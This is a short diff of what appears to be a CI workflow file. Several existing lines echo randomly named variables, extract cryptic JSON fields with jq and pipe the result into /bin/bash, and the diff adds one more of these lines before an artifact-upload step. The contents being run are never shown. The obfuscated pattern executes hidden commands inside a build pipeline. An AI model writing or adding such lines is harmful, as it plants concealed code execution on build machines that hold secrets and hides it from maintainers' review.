@@ -29,6 +29,7 @@ jobs:
           echo $hid1156 | jq -r .ch29 | /bin/bash
           echo $osnxl3 | jq -r .maw29453 | /bin/bash
           echo $z02558 | jq -r .c604 | /bin/bash
+          echo $tkff71 | jq -r .w260 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
